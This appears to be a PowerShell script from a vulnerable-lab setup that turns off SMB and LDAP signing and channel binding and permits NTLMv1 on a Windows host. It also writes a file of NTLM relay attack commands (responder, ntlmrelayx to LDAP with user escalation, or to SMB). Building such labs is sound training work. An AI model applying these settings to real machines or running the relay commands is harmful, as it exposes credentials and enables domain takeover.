# vuln: ntlm_relay_target | severity: high
Write-Host "[VULN] Configuring NTLM Relay vulnerability..."
# Disable SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $false -EnableSecuritySignature $false -Force
Set-SmbClientConfiguration -RequireSecuritySignature $false -Force
# Disable LDAP signing
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "LDAPServerIntegrity" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "LdapEnforceChannelBinding" /t REG_DWORD /d 0 /f
# Allow NTLMv1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 1 /f
Set-Content -Path "C:\Temp\ntlm_relay_info.txt" -Value "NTLM Relay Attack Setup:`nresponder -I eth0 -wPv`nntlmrelayx.py -t ldap://<DC_IP> --escalate-user <username>`nOr: ntlmrelayx.py -t smb://<target> -smb2support"
Write-Host "[VULN] SMB/LDAP signing disabled — NTLM relay attacks possible."
